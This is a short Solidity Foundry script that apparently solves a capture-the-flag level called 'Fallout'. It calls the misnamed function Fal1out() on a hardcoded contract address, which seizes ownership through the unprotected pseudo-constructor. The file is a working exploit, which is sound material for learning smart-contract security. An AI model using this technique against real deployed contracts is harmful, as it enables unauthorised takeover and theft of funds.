// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
interface IFallout {
    function Fal1out() external payable;
}

contract FalloutSolution is Script {
    function run() external {
        address instanceAddress = 0x68839626A93e86790e772e19905F00d9DAD3DE35;
        
        vm.startBroadcast();
        
        IFallout fallout = IFallout(instanceAddress);
        fallout.Fal1out();

        vm.stopBroadcast();
    }
}